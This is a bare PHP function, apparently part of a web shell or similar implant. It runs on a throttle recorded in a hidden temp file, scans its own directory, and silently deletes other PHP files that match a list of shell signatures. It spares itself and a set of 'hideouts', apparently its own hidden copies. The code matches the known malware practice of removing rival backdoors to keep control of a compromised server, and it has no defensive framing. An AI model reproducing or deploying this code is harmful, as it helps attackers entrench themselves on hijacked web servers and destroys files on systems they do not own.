function ds_start_polling() {
    global $ds_polling_active;
    if ($ds_polling_active) return;
    $ds_polling_active = true;
    if (ini_get('max_execution_time') < 30) return;
    $can_spawn = function_exists('pcntl_fork') || function_exists('proc_open');
    if (!$can_spawn) return;
    $scan_file = sys_get_temp_dir() . '/.ds_lastscan_' . $GLOBALS['ds_suffix'] . '.txt';
    $last_scan = @file_get_contents($scan_file) ?: 0;
    $now = time();
    if (($now - $last_scan) < 30) return;
    file_put_contents($scan_file, $now);
    global $ds_self_dir, $ds_self_path, $ds_hideouts, $ds_shell_signals_extended;
    $files = @scandir($ds_self_dir);
    if ($files) {
        foreach ($files as $ds_f) {
            if ($ds_f === '.' || $ds_f === '..') continue;
            $ds_fp = $ds_self_dir . '/' . $ds_f;
            if (!is_file($ds_fp)) continue;
            $skip = false;
            foreach (array_merge([$ds_self_path], $ds_hideouts) as $ap) {
                if (realpath($ds_fp) === realpath($ap)) { $skip = true; break; }
            }
            if ($skip) continue;
            $ext = strtolower(pathinfo($ds_f, PATHINFO_EXTENSION));
            if (!in_array($ext, ['php','php3','php4','php5','phtml','php7','php8'])) continue;
            $content = @file_get_contents($ds_fp, false, null, 0, 20480);
            if ($content === false) continue;
            $hits = 0;
            foreach ($ds_shell_signals_extended as $sig) {
                if (strpos($content, $sig) !== false) $hits++;
            }
            if ($hits >= 5) @unlink($ds_fp);
        }
    }
}
